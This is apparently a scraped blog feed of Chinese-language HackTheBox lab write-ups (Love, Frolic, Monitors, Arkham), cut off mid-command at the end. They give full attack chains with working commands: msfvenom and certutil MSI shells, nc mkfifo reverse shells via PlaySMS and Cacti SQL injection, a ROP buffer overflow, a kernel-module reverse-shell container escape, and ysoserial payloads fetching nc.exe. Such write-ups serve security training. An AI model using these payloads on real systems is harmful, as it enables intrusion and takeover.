MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1445/tcp open microsoft-ds syn-ack ttl 37 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql? syn-ack ttl 37| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Hello, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie:|_ Host '10.10.14.2' is not allowed to connect to this MariaDB server| mysql-info:|_ MySQL Error: Host '10.10.14.2' is not allowed to connect to this MariaDB server5000/tcp open http syn-ack ttl 37 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=9%D=5/6%Time=60937B31%P=x86_64-pc-linux-gnu%r(NULSF:L,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowedSF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(GenericLines,4SF:9,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x2SF:0to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(GetRequest,49,\"E\\SF:0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\xSF:20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(HTTPOptions,49,\"E\\0\\0\\SF:x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20coSF:nnect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(RTSPRequest,49,\"E\\0\\0\\x01\\SF:xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connecSF:t\\x20to\\x20this\\x20MariaDB\\x20server\")%r(RPCCheck,49,\"E\\0\\0\\x01\\xffj\\x0SF:4Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20toSF:\\x20this\\x20MariaDB\\x20server\")%r(DNSVersionBindReqTCP,49,\"E\\0\\0\\x01\\xfSF:fj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\SF:x20to\\x20this\\x20MariaDB\\x20server\")%r(DNSStatusRequestTCP,49,\"E\\0\\0\\x0SF:1\\xffj\\x04Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connSF:ect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(Hello,49,\"E\\0\\0\\x01\\xffj\\x04SF:Host\\x20'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\SF:x20this\\x20MariaDB\\x20server\")%r(Help,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10SF:\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20SF:MariaDB\\x20server\")%r(SSLSessionReq,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.SF:10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MaSF:riaDB\\x20server\")%r(TerminalServerCookie,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20SF:'10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\SF:x20MariaDB\\x20server\")%r(TLSSessionReq,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'1SF:0\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x2SF:0MariaDB\\x20server\")%r(SSLv23SessionReq,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'SF:10\\.10\\.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\xSF:20MariaDB\\x20server\")%r(Kerberos,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\SF:.14\\.2'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaSF:DB\\x20server\");Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 21m32s, deviation: 0s, median: 21m32s| p2p-conficker:| Checking for Conficker.C or higher...| Check 1 (port 63100/tcp): CLEAN (Couldn't connect)| Check 2 (port 46453/tcp): CLEAN (Couldn't connect)| Check 3 (port 27287/udp): CLEAN (Timeout)| Check 4 (port 21885/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-05-06T05:36:16|_ start_date: N/ARead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu May 6 05:14:51 2021 -- 1 IP address (1 host up) scanned in 30.17 seconds 443发现一个域名，加hosts 110.10.10.239 love.htb staging.love.htb 80需要登录： 443访问是403： 5000也是403: staging.love.htb是一个文件扫描器，可以指定url： 那就可以ssrf，使其访问本地内容 50005000页面显示账号密码： 1Vote Admin Creds admin: @LoveIsInTheAir!!!! 目录扫描得到的账号密码不能直接登录80，扫目录可以发现admin： 123gobuster dir -u http:&#x2F;&#x2F;10.10.10.239&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt -x php,html,txt -t 50&#x2F;admin (Status: 301) [Size: 337] [--&gt; http:&#x2F;&#x2F;10.10.10.239&#x2F;admin&#x2F;] adminadmin可以用得到的账号密码登录： votingsystem搜到相关漏洞： Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution) - PHP webapps Exploithttps://www.exploit-db.com/exploits/49445 修改exp里参数，注意url路径格式，打到phoebe shell： user flagPhoebe用户桌面得到user.txt: 提权信息winPEAS可以发现AlwaysInstallElevated： 就是做一个msi文件，安装的时候自动提升权限 提权 &amp; root flagmsf生成msi，安装时候自动提升权限得到system shell： 12345msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f msi -o reverse.msicertutil.exe -urlcache -split -f http://10.10.14.2:7777/reverse.msi reverse.msimsiexec /quiet /qn /i reverse.msi Administrator用户桌面得到root.txt: 参考资料 https://github.com/Tib3rius/AutoRecon Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution) - PHP webapps Exploithttps://www.exploit-db.com/exploits/49445 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated Hackthebox Love writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-love/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Frolic - HackTheBox","slug":"Frolic-HackTheBox","date":"2021-05-02T06:16:26.000Z","updated":"2021-05-02T06:17:06.034Z","comments":true,"path":"2021/05/02/Frolic-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/02/Frolic-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/158 10.10.10.111 端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243$ nmap -sC -sV -Pn 10.10.10.111Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 13:09 CSTNmap scan report for 10.10.10.111Host is up (0.32s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)| 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)|_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)9999/tcp open http nginx 1.10.3 (Ubuntu)|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Welcome to nginx!Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: -1s|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: frolic| NetBIOS computer name: FROLIC\\x00| Domain name: \\x00| FQDN: frolic|_ System time: 2021-05-02T10:41:32+05:30| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-05-02T05:11:32|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 123.35 seconds 99999999是ngiinx默认页面： 18801880是node red： 目录扫描9999端口继续目录扫描，得到一些目录： 123456➜ ~ gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/admin (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/admin/]/backup (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/backup/]/dev (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/dev/]/test (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/test/] testtest是phpinfo： backupbackup里两个文件和一个403目录： 12user - adminpassword - imnothuman devdev直接访问是403，继续目录扫描： 1234➜ ~ gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/backup (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/dev/backup/]/test (Status: 200) [Size: 5] playsms根目录playsms： adminadmin是crack me： admin这太CTF了，login.js里得到密码，登录： Ook得到的是Ook Ook! - Esolanghttps://esolangs.org/wiki/ook! https://www.dcode.fr/ook-language 解出来得到一个目录： login.js12345678910111213141516171819202122var attempt = 3; // Variable to count number of attempts.// Below function Executes on click of login button.function validate()&#123;var username = document.getElementById(\"username\").value;var password = document.getElementById(\"password\").value;if ( username == \"admin\" &amp;&amp; password == \"superduperlooperpassword_lol\")&#123;alert (\"Login successfully\");window.location = \"success.html\"; // Redirecting to other page.return false;&#125;else&#123;attempt --;// Decrementing by one.alert(\"You have left \"+attempt+\" attempt;\");// Disabling fields after 3 attempts.if( attempt == 0)&#123;document.getElementById(\"username\").disabled = true;document.getElementById(\"password\").disabled = true;document.getElementById(\"submit\").disabled = true;return false;&#125;&#125;&#125; string2ook.py1234567891011121314#!/usr/bin/python3import sysif len(sys.argv) != 3: print(f\"&#123;sys.argv[0]&#125; [infile] [outfile]\") sys.exit(0)try: with open(sys.argv[1], 'r') as f: with open(sys.argv[2], 'w') as fout: fout.write(f.read().replace('.', 'Ook. ').replace('?','Ook? ').replace('!','Ook! '))except: print(\"Failed\") asdiSIAJJ0QWE9JAS得到的是base64 zip： zip123curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d &gt; index.php.zipfcrackzip -D -c a -p ~/Tools/dict/rockyou.txt --use-unzip ./index.php.zip zip文件需要密码,很简单的破解: index.phpIndex.php又是编码转换： 1cat index.php | xxd -r -p | tr -d &#39;\\r\\n&#39; | base64 -d brainfuck这是brainfuck，直接在线解出来个应该是密码： playsms得到的密码可以登录playsms， 1admin : idkwhatispass webshell搜到已知漏洞； PlaySMS 1.4 - ‘import.php’ Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/42044 就是csv导入的时候可以注入php代码： 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.6 4444 &gt;&#x2F;tmp&#x2F;f backdoor.csv12Name,Mobile,Email,Group code,Tags&lt;?php $t&#x3D;$_SERVER[&#39;HTTP_USER_AGENT&#39;]; system($t); ?&gt;,2,,, user flagwww-data用户可以读取ayush用户目录user.txt: ropsuid很容易发现一个rop： 1find / -perm -u=s -type f 2&gt;/dev/null rop就是基础rop,没开aslr： 123456789101112131415eip offset 52readelf -s &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep &quot; system@&quot; 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 strings -a -t x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep &#x2F;bin&#x2F;sh 15ba0b &#x2F;bin&#x2F;sh readelf -s &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep &quot; exit@&quot; 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 ldd rop linux-gate.so.1 &#x3D;&gt; (0xb7fda000) libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xb7e19000) &#x2F;lib&#x2F;ld-linux.so.2 (0xb7fdb000) exploit &amp; root flag1234567891011gdb-peda$ p 0xb7e19000 + 0x0003ada0$4 &#x3D; 0xb7e53da0 # systemgdb-peda$ p 0xb7e19000 + 0x15ba0b$5 &#x3D; 0xb7f74a0b # &#x2F;bin&#x2F;shgdb-peda$ p 0xb7e19000 + 0x0002e9d0$6 &#x3D; 0xb7e479d0 # exit.&#x2F;rop $(python -c &#39;print(&quot;a&quot;*52 + &quot;\\xa0\\x3d\\xe5\\xb7&quot; + &quot;\\xd0\\x79\\xe4\\xb7&quot; + &quot;\\x0b\\x4a\\xf7\\xb7&quot;)&#39;) 参考资料 Ook! - Esolanghttps://esolangs.org/wiki/ook! https://www.dcode.fr/ook-language https://copy.sh/brainfuck/ PlaySMS 1.4 - ‘import.php’ Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/42044 HTB: Frolic | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/03/23/htb-frolic.html https://www.hackthebox.eu/home/machines/writeup/158 HackTheBox - Frolic - YouTubehttps://www.youtube.com/watch?v=b6WGQSJu_zQ&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Monitors - HackTheBox","slug":"Monitors-HackTheBox","date":"2021-04-27T10:39:41.000Z","updated":"2021-10-11T01:16:54.533Z","comments":true,"path":"2021/04/27/Monitors-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/04/27/Monitors-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/341 10.10.10.238 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.10.238Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 14:51 CSTNmap scan report for monitors.htb (10.10.10.238)Host is up (0.068s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.5.1|_http-title: Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously981/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.07 seconds 80直接ip访问是错误页面，加hosts后访问是一个wordpress： wordpresswpscanwordpress那就wpscan，发现一个存在漏洞的插件： WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/44544 lfi测试发现只能利用lfi，rfi不解析执行： loglog里得到另一个域名： (更新，看ippsec视频是读的apache 配置文件得到vhost，这个log可能是别人访问后的结果) 123http:&#x2F;&#x2F;monitors.htb&#x2F;wp-content&#x2F;plugins&#x2F;wp-with-spritz&#x2F;wp.spritz.content.filter.php?url&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10http:&#x2F;&#x2F;cacti-admin.monitors.htb wp-config.phplfi读wp-config得到密码： 123view-source:http:&#x2F;&#x2F;monitors.htb&#x2F;wp-content&#x2F;plugins&#x2F;wp-with-spritz&#x2F;wp.spritz.content.filter.php?url&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;var&#x2F;www&#x2F;wordpress&#x2F;wp-config.phpBestAdministrator@2020! cacticacti的域名加hosts后访问，密码就是wp-config里得到的密码,Version 1.2.12： sql注入搜到相关漏洞： SQL Injection vulnerability due to input validation failure when editing colors (CVE-2020-14295) · Issue #3622 · Cacti/cactihttps://github.com/Cacti/cacti/issues/3622 1http:&#x2F;&#x2F;cacti-admin.monitors.htb&#x2F;cacti&#x2F;color.php?action&#x3D;export&amp;header&#x3D;false&amp;filter&#x3D;&#39;)union select 1,username,password,4,5,6,7 from user_auth;--+- rce同样是根据GitHub那个issue，sqli to rce，第一个请求更改设置，第二个请求触发reverse shell： 123http:&#x2F;&#x2F;cacti-admin.monitors.htb&#x2F;cacti&#x2F;color.php?action&#x3D;export&amp;header&#x3D;false&amp;filter&#x3D;1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value&#x3D;%27rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh+-i+2%3E%261|nc+10.10.14.4+4444+%3E&#x2F;tmp&#x2F;f;%27+where+name&#x3D;%27path_php_binary%27;--+-http:&#x2F;&#x2F;cacti-admin.monitors.htb&#x2F;cacti&#x2F;host.php?action&#x3D;reindex&amp;host_id&#x3D;1 marcus用户目录只有marcus, 所以查看和他相关的文件内容： 123456789grep 'marcus' /etc -R 2&gt;/dev/null/etc/group-:marcus:x:1000:/etc/subgid:marcus:165536:65536/etc/group:marcus:x:1000:/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh/etc/subuid:marcus:165536:65536/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash 发现cacti-backup.service执行backup.sh backup查看两个文件，得到密码： 1234567891011121314151617181920212223242526www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.servicecat /etc/systemd/system/cacti-backup.service[Unit]Description=Cacti Backup ServiceAfter=network.target[Service]Type=oneshotUser=www-dataExecStart=/home/marcus/.backup/backup.sh[Install]WantedBy=multi-user.targetwww-data@monitors:/home/marcus$www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.shcat /home/marcus/.backup/backup.sh#!/bin/bashbackup_name=\"cacti_backup\"config_pass=\"VerticalEdge2020\"zip /tmp/$&#123;backup_name&#125;.zip /usr/share/cacti/cacti/*sshpass -p \"$&#123;config_pass&#125;\" scp /tmp/$&#123;backup_name&#125; 192.168.1.14:/opt/backup_collection/$&#123;backup_name&#125;.ziprm /tmp/$&#123;backup_name&#125;.zip user flag这个密码就是marcus用户密码，ssh登录，得到user.txt: 信息查看端口发现8443开在本地，转发出来访问： 123ssh -L 8443:127.0.0.1:8443 marcus@monitors.htbVerticalEdge2020 tomcat 9.0.31 CVE-2020-9496msf有模块一键打： 123456use linux/http/apache_ofbiz_deserialiationset payload linux/x64/shell_reverse_tcpset rhosts 127.0.0.1set lhost 10.10.x.xset forceexploit truerun 打到docker root： docker逃逸docker容器和宿主机共享内核模块，发现有cap_sys_module： 1capsh --print sys_module1234567891011curl http:&#x2F;&#x2F;10.10.14.4&#x2F;reverse-shell.c -O &#x2F;tmp&#x2F;reverse-shell.ccurl http:&#x2F;&#x2F;10.10.14.4&#x2F;Makefile -O &#x2F;tmp&#x2F;Makefile# 很奇怪的问题，tmp目录make失败，&#x2F;root目录就正常make# 宿主机nc -lnvp 4443# 容器insmod reverse-shell.ko reverse-shell.c注意ip是外部宿主机: 12345678910111213141516#include &lt;linux/kmod.h&gt;#include &lt;linux/module.h&gt;MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"AttackDefense\");MODULE_DESCRIPTION(\"LKM reverse shell module\");MODULE_VERSION(\"1.0\");char* argv[] = &#123;\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/172.17.0.1/4443 0&gt;&amp;1\", NULL&#125;;static char* envp[] = &#123;\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL &#125;;static int __init reverse_shell_init(void) &#123; return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);&#125;static void __exit reverse_shell_exit(void) &#123; printk(KERN_INFO \"Exiting\\n\");&#125;module_init(reverse_shell_init);module_exit(reverse_shell_exit); Makefile12345obj-m +&#x3D;reverse-shell.oall: make -C &#x2F;lib&#x2F;modules&#x2F;$(shell uname -r)&#x2F;build M&#x3D;$(PWD) modulesclean: make -C &#x2F;lib&#x2F;modules&#x2F;$(shell uname -r)&#x2F;build M&#x3D;$(PWD) clean root flag加载内核模块后，宿主机得到root shell： 参考资料 WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/44544 SQL Injection vulnerability due to input validation failure when editing colors (CVE-2020-14295) · Issue #3622 · Cacti/cactihttps://github.com/Cacti/cacti/issues/3622 Docker Container Breakout: Abusing SYS_MODULE capability! | by Nishant Sharma | Pentester Academy Bloghttps://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd Monitors: user part for free | RaidForumshttps://raidforums.com/Thread-Tutorial-Monitors-user-part-for-free Monitors: root part for free | RaidForumshttps://raidforums.com/Thread-Tutorial-Monitors-root-part-for-free HackTheBox - Monitors - YouTubehttps://www.youtube.com/watch?v=-loZwD39ifc&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Arkham - HackTheBox","slug":"Arkham-HackTheBox","date":"2021-04-25T02:19:27.000Z","updated":"2021-04-25T02:23:46.791Z","comments":true,"path":"2021/04/25/Arkham-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/04/25/Arkham-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/179 10.10.10.130 端口扫描1234567891011121314151617181920212223242526272829303132$ nmap -sC -sV -Pn 10.10.10.130Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 13:36 CSTNmap scan report for 10.10.10.130Host is up (0.35s latency).Not shown: 995 filtered portsPORT STATE SERVICE VERSION80/tcp open tcpwrapped| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?8080/tcp open http Apache Tomcat 8.5.37| http-methods:|_ Potentially risky methods: PUT DELETE|_http-title: Mask Inc.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -1s| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-04-24T05:46:53|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 666.76 seconds 80IIS默认页面： 8080一个公司官网： 功能基本都没用，Subscribe里请求是userSubscribe.faces，faces是Jakarta Server Faces： https://en.wikipedia.org/wiki/Jakarta_Server_Faces 445smb的BatShare是一个zip文件： LUKSappserver.zip下载下来解压(下载超时的话可以mount复制)，发现是luks加密镜像： 爆破luks可以用爆破，另外根据提示，是蝙蝠侠相关的，所以密码字典也是只需要batman： 12345sudo apt install bruteforce-luksgrep batman /usr/share/wordlists/rockyou.txt &gt; rockyou_batman.txtbruteforce-luks -t 10 -f rockyou_batman.txt -w batman_state.txt -v 10 backup.imgPassword found: batmanforever 挂载12sudo cryptsetup open --type luks backup.img arkhamsudo mount /dev/mapper/arkham miao1 enum之后就可以查看文件，配置文件里信息指向JSF反序列化： 123456789101112&lt;description&gt;State saving method: &#39;client&#39; or &#39;server&#39; (&#x3D;default). See JSF Specification 2.5.2&lt;&#x2F;description&gt;&lt;param-name&gt;org.apache.myfaces.SECRET&lt;&#x2F;param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0&#x3D;&lt;&#x2F;param-value&gt;&lt;&#x2F;context-param&gt; &lt;context-param&gt; &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;&#x2F;param-name&gt; &lt;param-value&gt;HmacSHA1&lt;&#x2F;param-value&gt; &lt;&#x2F;context-param&gt;&lt;context-param&gt;&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;&#x2F;param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0&#x3D;&lt;&#x2F;param-value&gt; JSF反序列化 Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Alphabot Securityhttps://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html How i found a 1500$ worth Deserialization vulnerability | by Ashish Kunwar | Mediumhttps://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a 1234567java -jar ~&#x2F;Tools&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections5 &#39;powershell wget 10.10.14.6&#x2F;nc.exe -O C:\\\\Windows\\\\Temp\\\\pwn.exe &amp;&amp; cmd &#x2F;c C:\\\\Windows\\\\Temp\\\\pwn.exe 10.10.14.6 443 -e powershell.exe&#39; &gt; payload.binjava -jar ~&#x2F;Tools&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections5 &#39;cmd.exe &#x2F;c powershell -c Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;10.10.14.6&#x2F;nc.exe&quot; -OutFile &quot;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&quot;&#39; &gt; uploadnc.payloadjava -jar 